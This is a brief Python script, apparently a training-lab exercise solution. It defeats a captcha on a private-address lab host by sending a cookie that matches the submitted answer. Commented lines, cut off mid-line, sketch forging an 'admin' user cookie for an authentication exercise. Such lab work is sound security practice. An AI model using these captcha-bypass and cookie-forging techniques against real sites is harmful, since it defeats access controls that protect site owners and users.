import requests


# <form action="submit" action="get">

#   <img src="captcha.png?t=1613656361.780905"/ > 
#   Answer: <input type="text" name="captcha"/>
#   <input type="submit" name="submit"/>
# </form>

data = {"captcha":"hacker", "submit": "Submit Query"}
cookies = {"captcha": "hacker"}

r = requests.get('http://10.0.1.11/captcha/example3/submit?', params=data, cookies=cookies)

print(r.url)
print(r.content)  

# cookies['user'] = admin
# print(f"{cookies['user']}")
# r = requests.get('http://10.0.1.11/authentication/example4